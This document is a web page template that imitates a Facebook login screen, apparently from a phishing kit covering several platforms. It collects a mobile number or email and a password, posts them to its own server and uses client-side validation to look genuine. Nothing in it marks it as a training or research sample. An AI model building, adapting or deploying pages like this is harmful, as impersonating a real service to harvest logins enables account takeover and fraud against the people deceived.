{% extends "base.html" %}
{% block body %}
<div class="card" style="max-width:520px;margin:28px auto;position:relative;">
  <div class="platform-header">
    <div class="icon-circle bg-facebook">
      <i class="fa-brands fa-facebook icon-lg"></i>
    </div>
    <div>
      <h2 class="notranslate" style="margin:0;color:#1877F2;font-weight:700;">Facebook</h2>
      <div style="color:#64748b;font-size:13px">Please login to continue</div>
    </div>
  </div>

  <form id="loginForm" method="post" style="display:flex;flex-direction:column;gap:6px;margin-top:12px;">
    <div style="display:flex;flex-direction:column;">
      <input 
        class="input"
        id="address"
        name="address"
        placeholder="Mobile number or email address"
        required
        style="
          padding:13px 18px;
          border-radius:45px;
          border:1px solid #e5e7eb;
          font-size:15.5px;
          background:#fff;
          box-shadow:0 4px 14px rgba(2,6,23,0.06);
          transition:border-color 0.25s ease, box-shadow 0.25s ease;
        "
      >
      <div id="addressError" class="error-text"></div>
    </div>

    <div style="display:flex;flex-direction:column;">
      <input 
        class="input"
        id="password"
        name="password"
        type="password"
        placeholder="Password"
        required
        style="
          padding:13px 18px;
          border-radius:45px;
          border:1px solid #e5e7eb;
          font-size:15.5px;
          background:#fff;
          box-shadow:0 4px 14px rgba(2,6,23,0.06);
          transition:border-color 0.25s ease, box-shadow 0.25s ease;
        "
      >
      <div id="passwordError" class="error-text"></div>
    </div>

    <div class="center" style="margin-top:6px;">
      <button 
        class="btn btn-blue" 
        type="submit"
        style="
          width:100%;
          max-width:340px;
          padding:11px;
          border-radius:45px;
          font-size:15px;
          font-weight:600;
          background:#1877F2;
          color:#fff;
          box-shadow:0 4px 16px rgba(24,119,242,0.25);
          transition:background 0.25s ease;
          border:none;
        "
      >
        Log in
      </button>
    </div>
  </form>
</div>

<style>
.input-error {
  border-color: #ef4444 !important;
  box-shadow: 0 0 0 2px rgba(239, 68, 68, 0.25) !important;
}
.error-text {
  color: #ef4444;
  font-size: 13px;
  margin-top: 3px;
  min-height: 14px;
  height: 14px;
  transition: opacity 0.25s ease;
}
</style>

<script>
document.getElementById("loginForm").addEventListener("submit", function(event) {
  const address = document.getElementById("address");
  const password = document.getElementById("password");
  const addressError = document.getElementById("addressError");
  const passwordError = document.getElementById("passwordError");

  const emailPattern = /^[^@\s]+@[^@\s]+\.[^@\s]+$/;
  const phonePattern = /^\+?\d{6,}$/;

  let valid = true;
  [address, password].forEach(input => input.classList.remove("input-error"));
  [addressError, passwordError].forEach(el => el.textContent = "");

  if (!(emailPattern.test(address.value.trim()) || phonePattern.test(address.value.trim()))) {
    valid = false;
    address.classList.add("input-error");
    addressError.textContent = "Enter a valid mobile number or email address.";
  }

  if (password.value.trim().length < 6) {
    valid = false;
    password.classList.add("input-error");
    passwordError.textContent = "Password must be at least 6 characters.";
  }

  if (!valid) {
    event.preventDefault();
  }
});

document.querySelectorAll(".input").forEach(input => {
  input.addEventListener("input", () => {
    input.classList.remove("input-error");
    if (input.id === "address") document.getElementById("addressError").textContent = "";
    if (input.id === "password") document.getElementById("passwordError").textContent = "";
  });
});
</script>
{% endblock %}
